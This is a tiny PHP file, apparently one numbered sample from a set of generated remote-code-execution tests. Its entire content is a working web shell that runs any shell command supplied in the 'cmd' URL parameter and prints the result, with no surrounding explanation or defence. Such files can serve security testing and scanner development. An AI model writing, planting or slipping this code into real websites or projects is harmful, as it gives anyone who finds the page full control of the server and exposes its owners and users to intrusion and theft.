<?php
// RCE test variation #1159
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>